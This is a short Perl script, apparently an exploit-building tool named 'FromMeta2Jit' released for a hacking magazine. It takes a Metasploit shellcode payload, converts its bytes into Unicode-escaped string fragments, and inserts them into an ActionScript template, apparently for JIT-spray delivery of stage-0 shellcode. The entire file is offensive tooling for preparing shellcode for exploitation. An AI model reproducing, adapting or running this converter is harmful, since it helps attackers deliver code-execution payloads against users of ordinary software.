#!/usr/bin/perl
#
# FromMeta2Jit
# Stage-0 JIT  ~ shellcode
# Author: Alexey Sintsov
#		  a.sintsov@dsec.ru
#		  dookie@inbox.ru
#
# PAYLOADS by METASPLOIT
#
#

use Switch;

$ARGC=@ARGV;

if ( ($ARGV[0]=~/-help|-h|help/) || ($ARGC<1)) {
 print "\n Usage:\n\n $0 <payload> \n";
 exit;
}


print "\n/*\nFrommETaSploit2JIT v 0.9b\nby Alexey Sintsov [DSecRG]\nhttp://dsecrg.com\n\nSpecial release for XAKEP magazine (http://www.xakep.ru)\n*/\n\n";

require($ARGV[0]) or die "Not found this payload: $ARGV[0]\n";


$shellcode=makeShellAS($buf,$ARGV[1]);


print $shellcode;

##################SUB##############

sub makeShellAS
{
	local ($payl,$par)=$_;
	($payl, $par) = ($_[0], $_[1]);
	require ("main.as");
	my $ret="";
	my $co=0;

	my $ll=length($payl);

	for($i=0;$i<$ll;$i+=2)
	{
		
		
		$ret.="shellcode=shellcode+";
		$ret.=sprintf("'\\u%02lx",ord substr($payl,($i+1),1));
		$ret.=sprintf("%02lx';\n",ord substr($payl,($i),1));
		
	}

$payl2 =~ s/%31337%/$ret/g;
return $payl2;
}